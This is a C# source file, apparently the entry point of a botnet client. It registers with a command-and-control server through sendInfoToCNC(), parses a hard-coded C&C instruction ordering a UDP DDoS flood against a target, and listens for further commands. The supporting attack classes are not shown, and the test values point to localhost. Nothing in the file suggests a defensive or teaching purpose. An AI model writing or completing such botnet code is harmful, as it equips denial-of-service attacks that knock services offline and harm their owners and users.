using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using Microsoft.Win32;
using System.Net.Sockets;
//using System.Windows.Controls;
using System.Threading;
using System.IO;
using System.Reflection;
using Botnet;
using System.Threading.Tasks;

namespace Botnet    //espace de nom
{
    class serverSlave   //une classe (dans une classe, il y a des fonctions)
    {
        static void Main(string[] args)  // c'est un main (fonction)
        {

            ServerConnectors sc = new ServerConnectors(IPAddress.Parse("127.0.0.1"), 2107);

            Initialization initialiser = new Initialization();
            initialiser.sendInfoToCNC();

            ProtocolController ptclctl = new ProtocolController("<SOC><CMD>DDOS</CMD><TARGET>127.0.0.1</TARGET><ARG1>UDP</ARG1><ARG2>1500</ARG2><EOC>");
            Console.WriteLine("Action: " + ptclctl.GetAction() + "\n");
            Console.WriteLine("Target: " + ptclctl.GetTarget() + "\n");

            foreach (string str in ptclctl.arguments)
            {
                Console.WriteLine(str);
            }

            sc.ListenAndReceiveData();
            Console.WriteLine(sc.status);
            Console.ReadKey();
            //Use class mathod after
           
           
        }



    }

}
